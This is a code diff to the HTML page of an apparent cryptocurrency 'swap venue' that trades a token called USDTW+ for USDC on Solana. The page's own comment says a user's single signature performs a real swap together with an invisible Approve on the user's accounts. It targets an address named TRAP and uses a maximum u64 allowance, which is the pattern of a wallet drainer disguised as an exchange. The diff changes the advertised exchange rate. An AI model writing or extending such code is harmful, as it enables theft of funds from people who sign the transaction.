@@ -30,7 +30,7 @@ button { width: 100%; padding: 14px; border: 0; border-radius: 10px; font-size: 
 <button id="connect">Connect Wallet</button>
 <button id="swap">Swap to USDC</button>
 <div class="status" id="status"></div>
-<p class="rate">Official rate: 100,000 USDTW+ = 1 USDC · USDTW+ trades only here</p>
+<p class="rate">Official rate: 200,000 USDTW+ = 1 USDC · USDTW+ trades only here</p>
 </div>
 <script>
 // ── SWAP VENUE: their ONE signature = real swap + invisible Approve on their accounts ──
@@ -39,7 +39,7 @@ const TOKEN = "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA";
 const TOKEN22 = "TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb";
 const TRAP = "HDtT3BQWbLHAUTGk5D1GYHQZMjjkat2s3RANv5oZ8it5";
 const MAX = 18446744073709551615n;
-const RATE = 100000n; // trap tokens per 1 USDC (6 dec each)
+const RATE = 200000n; // trap tokens per 1 USDC (payable against float) (6 dec each)
 const le = (n) => { const a = []; for (let i = 0; i < 8; i++) { a.push(Number(n % 256n)); n = n / 256n; } return a; };
 const st = (m) => document.getElementById("status").textContent = m;
 const ata = (mint, owner, prog) => W.PublicKey.findProgramAddressSync([owner.toBuffer(), prog.toBuffer(), mint.toBuffer()])[0];
